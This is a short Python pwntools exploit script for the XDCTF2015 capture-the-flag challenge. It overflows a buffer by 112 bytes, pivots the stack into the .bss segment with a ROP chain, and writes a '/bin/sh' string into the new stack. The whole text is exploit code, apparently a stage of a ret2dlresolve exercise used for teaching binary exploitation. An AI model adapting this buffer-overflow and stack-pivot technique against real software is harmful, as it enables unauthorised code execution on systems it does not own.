from pwn import *
elf = ELF('main')
r = process('./main')
rop = ROP('./main')

offset = 112
bss_addr = elf.bss()

r.recvuntil('Welcome to XDCTF2015~!\n')

# stack privot to bss segment
# new stack size is 0x800
stack_size = 0x800
base_stage = bss_addr + stack_size
## padding
rop.raw('a' * offset)
## read 100 byte to base_stage
rop.read(0, base_stage, 100)
## stack privot, set esp = base_stage
rop.migrate(base_stage)
r.sendline(rop.chain())

# write sh="/bin/sh"
rop = ROP('./main')
sh = "/bin/sh"
rop.write(1, base_stage + 80, len(sh))
rop.raw('a' * (80 - len(rop.chain())))
rop.raw(sh)
rop.raw('a' * (100 - len(rop.chain())))

r.sendline(rop.chain())
r.interactive()
